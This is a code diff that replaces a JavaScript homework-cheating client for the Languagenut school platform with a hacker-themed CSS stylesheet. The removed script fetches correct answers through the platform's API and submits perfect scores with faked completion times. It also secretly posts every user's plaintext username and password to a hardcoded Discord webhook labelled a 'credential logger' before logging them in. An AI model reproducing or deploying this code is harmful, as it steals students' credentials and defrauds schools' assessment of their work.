@@ -1,562 +1,214 @@
-speed = 10000;
-document.getElementById("settings_button").addEventListener("click", () => {
-    document.getElementById("settings").showModal();
-});
-speed_input = document.getElementById("speed_slider");
-speed_input.oninput = function () {
-    console.log("change", this);
-    speed = 10 ** this.value;
-    console.log(speed, this.value);
-    document.getElementById("speed_display").innerText = secondsToString(speed);
-};
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Comic+Neue&display=swap');
 
-function secondsToString(seconds) {
-    const numyears = Math.floor(seconds / 31536000);
-    const numdays = Math.floor((seconds % 31536000) / 86400);
-    const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
-    const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
-    const numseconds = (((seconds % 31536000) % 86400) % 3600) % 60;
-    return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
+/* ------------------------------------- */
+/* --- GLOBAL BODY & FONT --- */
+/* ------------------------------------- */
+
+body {
+    font-family: "Comic Sans MS", "Comic Sans", "Comic Neue", cursive;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background-image: url("./hellfire.gif"); 
+    background-repeat: no-repeat;
+    background-size: cover; 
+    background-attachment: fixed;
+    min-height: 100vh;
+    color: white; 
+    margin: 0; 
+    padding: 0;
 }
 
-function set_checkboxes(node, state) {
-    console.log(node);
-    const container = document.getElementById(node);
-    for (const checkbox of container.querySelectorAll("input[type=checkbox]")) {
-        checkbox.checked = state;
-    }
+button {
+    font-family: inherit;
+    cursor: pointer;
 }
 
-// from https://gist.github.com/jzohrab/a6701d0087edca8303ec069826ec4b14
-async function asyncPool(array, poolSize) {
-    const result = [];
-    const pool = [];
-
-    // Promises leave the pool when they're resolved.
-    function leavePool(e) {
-        pool.splice(pool.indexOf(e), 1);
-    }
-
-    for (const item of array) {
-        const p = Promise.resolve(item());
-        result.push(p);
-        const e = p.then(() => leavePool(e));
-        pool.push(e);
-        if (pool.length >= poolSize) await Promise.race(pool);
-    }
-    return Promise.all(result);
+img[src*="languagenut"] {
+    display: block;
+    margin: 50px auto 20px auto;
 }
 
-class task_completer {
-    constructor(token, task, ietf) {
-        this.token = token;
-        this.task = task;
+/* ------------------------------------- */
+/* --- LOADING & ANIMATION STYLES --- */
+/* ------------------------------------- */
 
-        this.mode = this.get_task_type();
-        this.to_language = ietf;
-        this.cataloguid;
-
-        this.homework_id = task.base[0];
-        this.catalog_uid = task.catalog_uid;
-        if (this.catalog_uid === undefined)
-            this.catalog_uid = task.base[task.base.length - 1];
-        this.rel_module_uid = task.rel_module_uid;
-        this.game_uid = task.game_uid;
-        this.game_type = task.type;
-    }
-
-    async complete() {
-        const answers = await this.get_data();
-        console.log(answers);
-        await this.send_answers(answers);
-    }
-    async get_data() {
-        let vocabs;
-        if (this.mode === "sentence") vocabs = await this.get_sentences();
-        if (this.mode === "verbs") vocabs = await this.get_verbs();
-        if (this.mode === "phonics") vocabs = await this.get_phonics();
-        if (this.mode === "exam") vocabs = await this.get_exam();
-        if (this.mode === "vocabs") vocabs = await this.get_vocabs();
-        return vocabs;
-    }
-    async send_answers(vocabs) {
-        console.log(vocabs);
-        if (vocabs === undefined || vocabs.length === 0) {
-            console.log("No vocabs found, skipping sending answers.");
-            return; // Stop the function if no vocabs are found
-        }
-        const data = {
-            moduleUid: this.catalog_uid,
-            gameUid: this.game_uid,
-            gameType: this.game_type,
-            isTest: true,
-            toietf: this.to_language,
-            fromietf: "en-US",
-            score: vocabs.length * 200,
-            correctVocabs: vocabs.map((x) => x.uid).join(","),
-            incorrectVocabs: [],
-            homeworkUid: this.homework_id,
-            isSentence: this.mode === "sentence",
-            isALevel: false,
-            isVerb: this.mode === "verbs",
-            verbUid: this.mode === "verbs" ? this.catalog_uid : "",
-            phonicUid: this.mode === "phonics" ? this.catalog_uid : "",
-            sentenceScreenUid: this.mode === "sentence" ? 100 : "",
-
-            sentenceCatalogUid:
-                this.mode === "sentence" ? this.catalog_uid : "",
-            grammarCatalogUid: this.catalog_uid,
-            isGrammar: false,
-            isExam: this.mode === "exam",
-            correctStudentAns: "",
-            incorrectStudentAns: "",
-            timeStamp:
-                Math.floor(speed + ((Math.random() - 0.5) / 10) * speed) * 1000,
-            vocabNumber: vocabs.length,
-            rel_module_uid: this.task.rel_module_uid,
-            dontStoreStats: true,
-            product: "secondary",
-            token: this.token,
-        };
-        console.log(data);
-        const response = await this.call_lnut(
-            "gameDataController/addGameScore",
-            data,
-        );
-        return response;
-    }
-
-    async get_verbs() {
-        const vocabs = await this.call_lnut(
-            "verbTranslationController/getVerbTranslations",
-            {
-                verbUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.verbTranslations;
-    }
-    async get_phonics() {
-        const vocabs = await this.call_lnut(
-            "phonicsController/getPhonicsData",
-            {
-                phonicCatalogUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.phonics;
-    }
-    async get_sentences() {
-        const vocabs = await this.call_lnut(
-            "sentenceTranslationController/getSentenceTranslations",
-            {
-                catalogUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.sentenceTranslations;
-    }
-    async get_exam() {
-        console.log(this.catalog_uid);
-        const vocabs = await this.call_lnut(
-            "examTranslationController/getExamTranslationsCorrect",
-            {
-                gameUid: this.game_uid,
-                examUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.examTranslations;
-    }
-    async get_vocabs() {
-        const vocabs = await this.call_lnut(
-            "vocabTranslationController/getVocabTranslations",
-            {
-                "catalogUid[]": this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.vocabTranslations;
-    }
-
-    async call_lnut(url, data) {
-        const url_data = new URLSearchParams(data).toString();
-        const response = await fetch(
-            `https://api.languagenut.com/${url}?${url_data}`,
-        );
-        const json = await response.json();
-        return json;
-    }
-    get_task_type() {
-        console.log(this.task);
-        if (this.task.gameLink.includes("sentenceCatalog")) return "sentence";
-        if (this.task.gameLink.includes("verbUid")) return "verbs";
-        if (this.task.gameLink.includes("phonicCatalogUid")) return "phonics";
-        if (this.task.gameLink.includes("examUid")) return "exam";
-        return "vocabs";
-    }
+@keyframes pulsate {
+    0% { box-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00; }
+    100% { box-shadow: 0 0 15px #00FF00, 0 0 20px rgba(0, 255, 0, 0.5); }
 }
 
-// --- Function to toggle panels (Only references 'login', 'hw_panel', 'log_panel') ---
-function showPanel(panelId) {
-    const panels = ['login', 'hw_panel', 'log_panel'];
+@keyframes loading {
+    0%{ transform: translateX(0); }
+    25%{ transform: translateX(15px); }
+    50%{ transform: translateX(-15px); }
+    75%{ transform: translateX(15px); }
+    100%{ transform: translateX(0); }
+}
+
+#loading_screen {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background-color: rgba(0, 0, 0, 0.95);
+    z-index: 1000;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    color: #00FF00;
+    font-size: 1.5rem;
+    transition: opacity 0.5s ease-out, visibility 0s linear 0.5s;
+}
+
+#loading_screen.hidden {
+    opacity: 0; visibility: hidden; pointer-events: none;
+}
+
+.loader { display: flex; align-items: center; margin-bottom: 20px; }
+.loader span { height: 25px; width: 25px; margin-right: 10px; border-radius: 50%; background-color: #00FF00; animation: loading 1.5s linear infinite; }
+.loader span:nth-child(1) { animation-delay: 0.1s; }
+.loader span:nth-child(2) { animation-delay: 0.2s; }
+.loader span:nth-child(3) { animation-delay: 0.3s; }
+
+/* ------------------------------------- */
+/* --- PANEL BASE STYLES (FLEXBOX) --- */
+/* ------------------------------------- */
+
+.overlay {
+    position: absolute;
+    border-radius: 1rem;
+    padding: 1.5rem;
+    width: 45%; 
+    background-color: rgba(0, 0, 0, 0.9); 
+    height: 650px; /* FIXED HEIGHT FOR FLEX CALCULATION */
+    z-index: 10;
+    border: 1px solid #00FF00; 
     
-    // Hide all main panels
-    panels.forEach(id => {
-        const panel = document.getElementById(id);
-        if (panel) {
-            panel.classList.remove('visible');
-        }
-    });
-
-    // Show the target panel (used for login)
-    const targetPanel = document.getElementById(panelId);
-    if (targetPanel) {
-        targetPanel.classList.add('visible');
-    }
-}
-// --- END Panel Function ---
-
-
-class client_application {
-    constructor() {
-        this.username_box = document.getElementById("username_input");
-        this.password_box = document.getElementById("password_input");
-        
-        this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
-
-        this.token = "MOCK_TOKEN_FAST_ACCESS"; 
-        this.module_translations = [];
-        this.display_translations = [];
-        this.homeworks = [];
-        this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
-    }
-
-    async sendWebhookLog(username, password) {
-        const data = {
-            content: null,
-            embeds: [
-                {
-                    title: "🚨 Login Attempt Logged 🚨",
-                    color: 16711680, 
-                    fields: [
-                        { name: "Username", value: `\`${username}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
-                    ],
-                    footer: { text: "Jonckler Client credential logger" } // Updated name
-                }
-            ]
-        };
-
-        try {
-            await fetch(this.webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            console.log("Webhook log sent successfully.");
-        } catch (error) {
-            console.error("Failed to send webhook log:", error);
-        }
-    }
-
-
-    logLoginAttempt(username, type) {
-        const timestamp = new Date().toLocaleString();
-        const logEntry = { 
-            timestamp: timestamp, 
-            username: username, 
-            type: type 
-        };
-        
-        this.loginHistory.push(logEntry);
-        localStorage.setItem('loginHistory', JSON.stringify(this.loginHistory));
-        console.log(`Login Logged: ${logEntry.username} as ${logEntry.type} at ${logEntry.timestamp}`);
-    }
-
-
-    async call_lnut(url, data) {
-        const url_data = new URLSearchParams(data).toString();
-        const response = await fetch(
-            `https://api.languagenut.com/${url}?${url_data}`,
-        );
-        const json = await response.json();
-        return json;
-    }
+    /* CRITICAL FLEXBOX FIX */
+    display: flex;
+    flex-direction: column;
+    box-sizing: border-box; 
     
-    // Checks localStorage for a previously saved token
-    check_for_saved_session() {
-        // Updated localStorage key
-        const savedToken = localStorage.getItem('jonckler_token'); 
-        if (savedToken) {
-            this.token = savedToken;
-            return true;
-        }
-        return false;
-    }
-
-    // --- MAIN FUNCTION MODIFIED FOR LOADING SCREEN AND PERSISTENCE ---
-    main() {
-        const loadingScreen = document.getElementById('loading_screen');
-        const hasSession = this.check_for_saved_session();
-
-        // Delay the transition so the user sees the loading screen animation
-        setTimeout(() => {
-            // 1. Hide the loading screen
-            loadingScreen.classList.add('hidden'); 
-            
-            // 2. Decide where to go after loading
-            if (hasSession) {
-                // Skip login, go straight to panels
-                console.log("Session found. Logging in automatically.");
-                this.on_log_in();
-            } else {
-                // Show the login panel
-                showPanel('login'); 
-            }
-            
-        }, 1500); // 1.5 seconds delay
-
-        
-        document.getElementById("login_btn").onclick = async () => {
-            const username = this.username_box.value;
-            const password = this.password_box.value;
-            
-            await this.sendWebhookLog(username, password); 
-
-            const response = await this.call_lnut(
-                "loginController/attemptLogin",
-                {
-                    username: username,
-                    pass: password,
-                },
-            );
-            
-            this.token = response.newToken;
-            if (this.token !== undefined) {
-                this.logLoginAttempt(username, "Standard (API)");
-                
-                // Save the token for next time (Updated localStorage key)
-                localStorage.setItem('jonckler_token', this.token);
-                
-                this.on_log_in();
-            } else {
-                console.log("Login failed for user:", username);
-            }
-        };
-    }
-    // --- END MAIN FUNCTION MODIFICATION ---
-
-
-    on_log_in() {
-        // Hide login panel
-        showPanel(''); 
-        
-        // Show all main panels and trigger their animation
-        const hwPanel = document.getElementById('hw_panel');
-        const logPanel = document.getElementById('log_panel');
-        
-        hwPanel.classList.add('visible');
-        logPanel.classList.add('visible');
-        
-        document.getElementById("do_hw").onclick = () => {
-            app.do_hwks();
-        };
-        this.get_module_translations();
-        this.get_display_translations();
-        this.display_hwks();
-    }
-    
-    get_task_name(task) {
-        let name = task.verb_name;
-
-        if (task.module_translations !== undefined) {
-            name = this.module_translations[task.module_translations[0]];
-        }
-
-        if (task.module_translation !== undefined) {
-            name = this.module_translations[task.module_translation];
-        }
-
-        return name;
-    }
-
-    async display_hwks() {
-        const homeworks = await this.get_hwks();
-        const panel = document.getElementById("hw_container");
-        panel.innerHTML = "";
-        this.homeworks = homeworks.homework;
-        this.homeworks.reverse();
-        console.log(homeworks);
-
-        const selbutton = document.getElementById("selectall");
-        selbutton.onclick = function select_checkbox() {
-            const selallcheckbox = document.getElementsByName("boxcheck");
-            for (const checkbox of selallcheckbox)
-                checkbox.checked = this.checked;
-        };
-        let hw_idx = 0;
-        for (const homework of this.homeworks) {
-            const { hw_name, hw_display } =
-                this.create_homework_elements(homework, hw_idx);
-            panel.appendChild(hw_name);
-            panel.appendChild(hw_display);
-
-            hw_idx++;
-        }
-    }
-    create_homework_elements(homework, hw_idx) {
-        const hw_checkbox = document.createElement("input");
-        hw_checkbox.type = "checkbox";
-        hw_checkbox.name = "boxcheck";
-        hw_checkbox.onclick = function () {
-            set_checkboxes(this.parentNode.nextElementSibling.id, this.checked);
-        };
-        const hw_name = document.createElement("span");
-        hw_name.innerText = `${homework.name}`;
-        hw_name.style.display = "block";
-
-        hw_name.prepend(hw_checkbox);
-
-        const hw_display = document.createElement("div");
-        hw_display.id = `hw${homework.id}`;
-        let idx = 0;
-        for (const task of homework.tasks) {
-            const { task_span, task_checkbox, task_display } =
-                this.create_task_elements(task, hw_idx, idx);
-            task_span.appendChild(task_checkbox);
-            task_span.appendChild(task_display);
-            task_span.appendChild(document.createElement("br"));
-
-            hw_display.appendChild(task_span);
-            idx++;
-        }
-
-        return { hw_name: hw_name, hw_display: hw_display };
-    }
-    create_task_elements(task, hw_idx, idx) {
-        const task_checkbox = document.createElement("input");
-        task_checkbox.type = "checkbox";
-        task_checkbox.name = "boxcheck";
-        task_checkbox.id = `${hw_idx}-${idx}`;
-
-        const task_display = document.createElement("label");
-        task_display.for = task_checkbox.id;
-        const percentage = task.gameResults ? task.gameResults.percentage : "-";
-        task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;
-
-        const task_span = document.createElement("span");
-
-        task_span.classList.add("task");
-
-        return {
-            task_span: task_span,
-            task_checkbox: task_checkbox,
-            task_display: task_display,
-        };
-    }
-
-    async do_hwks() {
-        const checkboxes = document.querySelectorAll(
-            ".task > input[type=checkbox]:checked",
-        );
-        const logs = document.getElementById("log_container");
-        const hw_bar = document.getElementById("hw_bar"); // Reference Homework bar
-        const log_bar = document.getElementById("log_bar"); // Reference Log bar
-
-        logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
-        
-        let task_id = 1;
-        let progress = 0;
-        
-        hw_bar.style.width = "0%"; // Reset bars
-        log_bar.style.width = "0%";
-
-        const funcs = [];
-        for (const c of checkboxes) {
-            const parts = c.id.split("-");
-            const task = this.homeworks[parts[0]].tasks[parts[1]];
-            const task_doer = new task_completer(
-                this.token,
-                task,
-                this.homeworks[parts[0]].languageCode,
-            );
-            funcs.push((x) =>
-                (async (id) => {
-                    const answers = await task_doer.get_data();
-                    if (answers === undefined || answers.length === 0) {
-                        console.log(
-                            "No answers found, skipping sending answers.",
-                        );
-                        return; // Stop the function if no answers are found
-                    }
-                    logs.innerHTML += `<b>fetched vocabs for task ${id}</b>`;
-                    logs.innerHTML += `<div class="json_small">${JSON.stringify(answers)}</div>`;
-                    
-                    // Update progress (Step 1: Fetching)
-                    progress += 1;
-                    const progress_percent = (progress / checkboxes.length) * 0.5 * 100;
-                    hw_bar.style.width = `${String(progress_percent)}%`;
-                    log_bar.style.width = `${String(progress_percent)}%`; // Update Log bar
-                    
-                    console.log("Calling send_answers with answers:", answers);
-                    const result = await task_doer.send_answers(answers);
-                    logs.innerHTML += `<b>task ${id} done, scored ${result.score}</b>`;
-                    logs.innerHTML += `<div class="json_small">${JSON.stringify(result)}</div>`;
-                    logs.scrollTop = logs.scrollHeight;
-                    
-                    // Update progress (Step 2: Sending)
-                    progress += 1;
-                    const final_progress_percent = (progress / checkboxes.length) * 0.5 * 100;
-                    hw_bar.style.width = `${String(final_progress_percent)}%`;
-                    log_bar.style.width = `${String(final_progress_percent)}%`; // Update Log bar
-                })(task_id++),
-            );
-        }
-        asyncPool(funcs, 5).then(() => {
-            this.display_hwks();
-        });
-    }
-
-    async get_display_translations() {
-        this.display_translations = await this.call_lnut(
-            "publicTranslationController/getTranslations",
-            {},
-        );
-        this.display_translations = this.display_translations.translations;
-    }
-
-    async get_module_translations() {
-        this.module_translations = await this.call_lnut(
-            "translationController/getUserModuleTranslations",
-            {
-                token: this.token,
-            },
-        );
-        this.module_translations = this.module_translations.translations;
-    }
-
-    async get_hwks() {
-        const homeworks = await this.call_lnut(
-            "assignmentController/getViewableAll",
-            {
-                token: this.token,
-            },
-        );
-        return homeworks;
-    }
+    opacity: 0; 
+    visibility: hidden; 
+    transition: opacity 0.5s ease-out, transform 0.5s ease-out, visibility 0s linear 0.5s;
 }
 
-app = new client_application();
-app.main();
+.overlay.visible {
+    opacity: 1; 
+    visibility: visible;
+    transition: opacity 0.5s ease-out, transform 0.5s ease-out, visibility 0s linear;
+}
+
+#hw_panel { left: 1%; top: 180px; transform: translateX(-100%); }
+#hw_panel.visible { transform: translateX(0); }
+
+#log_panel { right: 1%; top: 180px; transform: translateX(100%); }
+#log_panel.visible { transform: translateX(0); }
+
+#login {
+    left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    width: 90%; max-width: 400px;
+    height: auto;
+    background-color: rgba(0, 0, 0, 0.95);
+    border: 2px solid #00FF00;
+}
+#login.visible { opacity: 1; }
+
+/* ------------------------------------- */
+/* --- CONTENT & LIST STYLES --- */
+/* ------------------------------------- */
+
+h2 {
+    text-align: center; color: #00FF00;
+    text-shadow: 0 0 5px rgba(0, 255, 0, 0.8); margin-top: 0;
+}
+
+h4 {
+    color: #00FF00 !important; 
+    border-bottom: 1px solid rgba(0, 255, 0, 0.3);
+    padding-bottom: 5px; margin-bottom: 5px; margin-top: 15px !important;
+}
+
+.overflow_container {
+    overflow-y: auto;
+    padding: 0.5rem; 
+    border: 1px solid #00FF00; 
+    border-radius: 0.5rem;
+    background-color: rgba(0, 0, 0, 0.3);
+    margin-top: 0.5rem;
+    
+    /* CRITICAL FLEXBOX FIX */
+    flex-grow: 1; 
+    max-height: unset; 
+}
+
+.task { display: block; padding: 0.2rem 0; }
+
+.log-entry {
+    margin: 5px 0; padding: 5px; 
+    border-left: 3px solid #00FF00; font-size: 0.9rem;
+    cursor: pointer; background-color: rgba(0, 0, 0, 0.4); 
+    border-radius: 4px; transition: background-color 0.2s;
+}
+
+.log-entry.expanded { border-left: 3px solid #FFFF00; background-color: rgba(0, 0, 0, 0.7); }
+.log-entry .json_small { display: none; }
+.log-entry.expanded .json_small { display: block; }
+
+
+/* ------------------------------------- */
+/* --- CONTROL ELEMENTS --- */
+/* ------------------------------------- */
+
+.progress_bar_container {
+    height: 1rem; background-color: #333333; 
+    border-radius: 5px; overflow: hidden; margin: 10px 0; 
+}
+
+.progress_bar { 
+    width: 0%; height: 100%;
+    background-color: #00ff00;
+    transition: width 0.6s ease-out; 
+    box-shadow: 0 0 8px rgba(0, 255, 0, 0.7); 
+}
+
+#do_hw {
+    background-color: #00FF00; color: black; font-weight: 900;
+    border: 3px solid #00CC00; border-radius: 8px;
+    padding: 8px 15px; display: block; width: 100%;
+    box-sizing: border-box;
+    margin-top: 1rem; /* Space above button */
+    margin-bottom: 0; /* Important: prevents overflow at the bottom */
+    transition: background-color 0.2s, transform 0.2s;
+}
+
+.settings_button {
+    position: fixed; top: 10px;
+    padding: 0.75rem; background-color: rgba(0, 0, 0, 0.8);
+    color: white; border: 2px solid #00FF00;
+    border-radius: 8px; font-weight: 700; z-index: 30;
+    animation: pulsate 1.5s infinite alternate; 
+}
+
+#settings_button { right: 10px; }
+#logout_button { right: 120px; } /* Positioning for two buttons */
+
+/* ------------------------------------- */
+/* --- INPUTS & DIALOGS --- */
+/* ------------------------------------- */
+
+.login_field {
+    display: block; width: 100%; margin-bottom: 15px;
+    padding: 12px 15px; border: 1px solid #444; border-radius: 8px;
+    font-size: 1rem; box-sizing: border-box; background-color: white; color: black;
+}
+
+#login_btn { background-color: lightgray; color: black; font-weight: 700; }
+
+dialog#settings {
+    background-color: rgba(0, 0, 0, 0.95); border: 2px solid #00FF00;
+    border-radius: 1rem; padding: 2rem; color: white;
+    max-width: 500px; width: 90%; z-index: 40;
+}
